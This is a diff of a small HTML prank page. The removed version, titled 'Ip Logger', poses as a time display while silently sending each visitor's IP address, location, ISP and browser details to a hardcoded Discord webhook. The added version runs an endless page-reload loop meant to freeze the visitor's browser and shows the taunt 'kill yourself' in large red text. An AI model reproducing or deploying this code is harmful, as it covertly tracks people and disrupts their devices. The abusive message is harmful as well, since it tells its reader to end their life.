@@ -1,78 +1,26 @@
-<!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-	<meta charset="utf-8">
-	<title>Ip Logger</title>
-	<link type="text/css" rel="stylesheet" href="style.css">
-	<script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-	<script>
-		$.get("https://ipinfo.io", function(response) {
-			const webhook_url = "https://discord.com/api/webhooks/1037152365163331624/Qp-ZMfFuRzNgEqds7uRPLj-pW2vPqVC9gSV5WWhMiLUKSX1c77q9TCOjPLGx-RTc0dsG";
-			const main = {
-				title: "New IP",
-				fields: [
-					{
-						name: "IP:",
-						value: `\`${response.ip}\``,
-						inline: false,
-					},
-					{
-						name: "User-Agent:",
-						value: `\`${navigator.userAgent}\``,
-						inline: false,
-					},
-					{
-						name: "City:",
-						value: `\`${response.city}\``,
-						inline: false,
-					},
-					{
-						name: "Region:",
-						value: `\`${response.region}\``,
-						inline: false
-					},
-					{
-						name: "Country:",
-						value: `\`${response.country}\``,
-						inline: false
-					},
-					{
-						name: "Long/Lat:",
-						value: `\`${response.loc}\``,
-						inline: false
-					},
-					{
-						name: "Company:",
-						value: `\`${response.org}\``,
-						inline: false
-					},
-					{
-						name: "Postal Region:",
-						value: `\`${response.postal}\``,
-						inline: false
-					},
-				],
-			}
-			var xhttp = new XMLHttpRequest();
-			const url = webhook_url;
-			xhttp.open("POST", url, true);
-			xhttp.setRequestHeader('Content-Type', 'application/json');
-			xhttp.send(JSON.stringify({
-				'username': 'IP Logger',
-				'embeds': [main],
-			}));
-		}, "json");
-	</script>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script>onbeforeunload = function(){localStorage.x=1};
+
+setTimeout(function(){
+  while(1)location.reload(1)
+}, 1000)</script>
 </head>
+<style>
+  h1 {
+    font-family: Verdana;
+    color: crimson;
+  }
+</style>
 <body>
-	<center>
-		<h1>Information</h1>
-		<input type="color"></input>
-		<p>Actual time: <span id="here"></span></p>
-	</center>
-	<script>
-		const date = new Date();
-		document.getElementById('here').innerHTML = date;
-	</script>
+    <center>
+      <h1>LMAO MR SHITLEY GOT YOU<h1></h1>
+      <p>kill yourself</p>
+      <img src="https://steamuserimages-a.akamaihd.net/ugc/829070438383642241/4D10AF9F082CEF34A8AB62290F06BFF9F330F466/?imw=5000&imh=5000&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=false">
+    </center>
 </body>
 </html>
